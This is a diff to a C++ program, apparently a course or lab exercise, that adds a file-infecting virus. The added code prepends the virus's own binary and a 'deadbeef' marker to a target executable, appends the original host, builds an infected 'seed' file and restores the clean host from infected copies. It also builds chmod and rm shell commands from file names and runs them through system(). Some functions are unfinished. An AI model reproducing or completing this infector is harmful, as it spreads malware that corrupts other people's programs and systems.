@@ -11,108 +11,162 @@
 using namespace std;
 
 bool is_file_exist(std::string fileName);
-bool can_create_directory(std::string directory);
+void create_directory(std::string directory);
 void copy_binary(std::string host, std::string folder);
-bool check_write_access(std::string fileName);
-void modify_execute_access(std::string fileName);
+void copy_uninfected_binary(std::string host, std::string folder);
+void modify_execute_access(std::string fileName, bool enable);
 int get_file_size(std::string fileName);
-bool is_file_infected(std::string fileName);
+void build_seed(std::string programName);
+void copy_virus_binary(std::string host, std::string folder);
+void infect_file(std::string infectedHost, std::string fileName, std::string folder, std::string temporaryLocation);
+void make_temp_copy(std::string infectedHost, std::string fileName, std::string folder, std::string temporaryLocation);
+int get_virus_size();
 
 int main(int argc, char** argv) {
     std::string fileName;
-    std::string hostName = argv[0];
+    std::string argv0(argv[0]);
+    std::string hostName = argv0.substr(2);
+    std::string temporaryLocation = "garbage";
     std::string folder = "./tem/";
-    
-    if(can_create_directory(folder)){
-      copy_binary(hostName.substr(2), folder);
-    }
-    
+    create_directory(folder);
     if(argc > 1){
       fileName = argv[1];
+      copy_uninfected_binary(hostName, folder);
+      make_temp_copy(hostName, fileName, folder, temporaryLocation);
+      infect_file(hostName, fileName, folder, temporaryLocation);
     }
     else{
+      if(hostName == "virus"){
+        build_seed(hostName);
+        return 1;
+      }
       fileName = "";
     }
-    //if(check_write_access(fileName)){
-      modify_execute_access(fileName);
-      get_file_size(fileName);
-      is_file_infected(fileName);
-    //}
     return 0;
 }
 
-bool is_file_infected(std::string fileName){
-  std::string virusName = "virus";
-  int virusSize = get_file_size(virusName);
-  virusSize = 4;
-  const char*fName  = fileName.c_str();
-  ifstream myFile (fileName, ios::in | ios::binary);
-  myFile.seekg(virusSize);
-  char arr[4];
-  myFile.read(arr, 4);
-  int i = 0;
-  while(i < 4){
-    cout<<arr[i]<<endl;
-    i++;
+bool is_infected(std::string infectedHost, std::string binary){
+
+  int virusSize = get_virus_size();
+
+}
+
+void build_seed(std::string progName){
+  std::ifstream virus(progName, std::ios::binary);
+  std::ifstream host("host", std::ios::binary);
+  std::ofstream seed("seed", std::ios::binary);
+  seed << virus.rdbuf();
+  std::string hex = "deadbeef";
+  for (size_t i = 0; i < hex.length(); i += 2)
+  {
+    uint16_t byte;
+    std::string nextbyte = hex.substr(i, 2);
+    std::istringstream(nextbyte) >> std::hex >> byte;
+    seed << static_cast<uint8_t>(byte);
   }
-  myFile.close();
-  return false;
-  /*FILE * pFile;
-  pFile = fopen ( fName , "rb" );
-  /*fseek ( pFile , virusSize , SEEK_SET );
-  int arr[4];
-  int i = 0;
-  while(i < 4){
-    arr[i] = fgetc(pFile);
-    cout<<arr[i];
-    i++;
-  }
-  fclose(pFile);
-  return false;*/
+  seed << host.rdbuf();
+  seed.close();
+  host.close();
+  virus.close();
+  modify_execute_access("seed", true);
 }
 
 int get_file_size(std::string fileName){
   return std::filesystem::file_size(fileName);
 }
 
-/*bool check_write_access(std::string fileName){
-  if(is_file_exist(fileName)){
-    const char* file = fileName.c_str();
-    FILE *fp = fopen(file, "w");
-    if(fp != NULL){
-      fclose(fp);
-      return true;
-    }
-  }
-  return false;
-}*/
-
-void modify_execute_access(std::string fileName){
-    std::string cmdBuilder = fileName;
-    cmdBuilder.insert(0, "chmod ugo-x ");
-    const char*command  = cmdBuilder.c_str();
-    cout << command << endl;
-    system(command);
+int get_virus_size(){
+  return get_file_size("virus");
 }
 
-void copy_binary(std::string host, std::string folder){
-    std::string hostSrc = host.substr(2);
-    std::string hostDest = host.substr(2);
+void copy_virus_binary(std::string host, std::string folder){
+    std::string hostSrc = host;
+    std::string hostDest = "virus";
+    hostDest.insert(0, folder);
+    std::ifstream src(hostSrc, std::ios::binary);
+    std::ofstream dst(hostDest, std::ios::binary);
+    int virusSize = get_virus_size();
+    char buffer[virusSize];
+    size_t actual = src.readsome(buffer, virusSize);
+    dst.write(buffer, actual);
+    src.close();
+    dst.close();
+}
+
+void make_temp_copy(std::string infectedHost, std::string fileName, std::string folder, std::string temporaryLocation){
+    std::string hostSrc = fileName;
+    std::string hostDest = temporaryLocation;
     hostDest.insert(0, folder);
     std::ifstream src(hostSrc, std::ios::binary);
     std::ofstream dst(hostDest, std::ios::binary);
     dst << src.rdbuf();
 }
 
+void infect_file(std::string infectedHost, std::string fileName, std::string folder, std::string temporaryLocation){
+    std::string hostSrc = infectedHost;
+    std::string hostDest = fileName;
+    std::ifstream src(hostSrc, std::ios::binary);
+    std::ofstream dst(hostDest, std::ios::binary);
+    int virusSize = get_virus_size();
+    cout<< virusSize << endl;
+    char buffer[virusSize];
+    size_t actual = src.readsome(buffer, virusSize);
+    dst.write(buffer, actual);
+    src.close();
+    std::string hex = "deadbeef";
+    for (size_t i = 0; i < hex.length(); i += 2)
+    {
+      uint16_t byte;
+      std::string nextbyte = hex.substr(i, 2);
+      std::istringstream(nextbyte) >> std::hex >> byte;
+      dst << static_cast<uint8_t>(byte);
+    }
+    hostSrc = temporaryLocation;
+    hostSrc.insert(0, folder);
+    cout << hostSrc;
+    std::ifstream src1(hostSrc, std::ios::binary);
+    dst << src1.rdbuf();
+    dst.close();
+    src1.close();
+    if(is_file_exist("temporaryLocation")){
+      temporaryLocation.insert(0, "rm ");
+      cout << temporaryLocation << endl;
+      system(temporaryLocation.c_str());
+    }
+}
 
+void copy_uninfected_binary(std::string host, std::string folder){
+    std::string hostSrc = host;
+    std::string hostDest = host;
+    hostDest.insert(0, folder);
+    std::ifstream src(hostSrc, std::ios::binary);
+    std::ofstream dst(hostDest, std::ios::binary);
+    int virusSize = get_virus_size();
+    src.seekg(virusSize + 4);
+    dst << src.rdbuf();
+}
 
-bool can_create_directory(std::string directory){
+void modify_execute_access(std::string fileName, bool enable){
+    std::string cmdBuilder = fileName;
+    if(enable){
+      cmdBuilder.insert(0, "chmod ugo+x ");  
+    }
+    else{
+      cmdBuilder.insert(0, "chmod ugo-x ");  
+    }
+    const char*command  = cmdBuilder.c_str();
+    system(command);
+}
+
+void create_directory(std::string directory){
   const char* dir = directory.c_str();
   int check = mkdir(dir, 0777);
     if(check == -1){
-      return false;
+      std::string cmdBuilder = directory;
+      cmdBuilder.insert(0, "chmod 0777 ");
+      const char*command  = cmdBuilder.c_str();
+      system(command);
     }
-    return true;
 }
 
 bool is_file_exist(std::string fileName)
